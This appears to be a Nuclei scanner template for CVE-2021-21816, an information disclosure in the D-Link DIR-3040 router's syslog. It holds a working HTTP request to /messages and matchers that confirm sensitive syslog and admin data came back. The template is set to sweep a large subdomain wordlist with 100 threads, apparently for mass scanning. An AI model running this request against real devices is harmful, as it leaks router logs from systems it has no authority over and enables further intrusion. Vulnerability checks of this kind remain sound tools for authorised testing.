id: CVE-2021-21816

info:
  name: D-LINK DIR-3040 - Syslog Information Disclosure
  description: An information disclosure vulnerability exists in the Syslog functionality of D-LINK DIR-3040 1.13B03. A specially crafted network request can lead to the disclosure of sensitive information. An attacker can send an HTTP request to trigger this vulnerability.
  author: gy741
  severity: medium
  reference: https://talosintelligence.com/vulnerability_reports/TALOS-2021-1281
  tags: cve,cve2021,dlink,exposure,router

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /messages HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "syslog:"
          - "admin"
          - "/etc_ro/lighttpd/www"
        part: body
        condition: and

      - type: status
        status:
          - 200
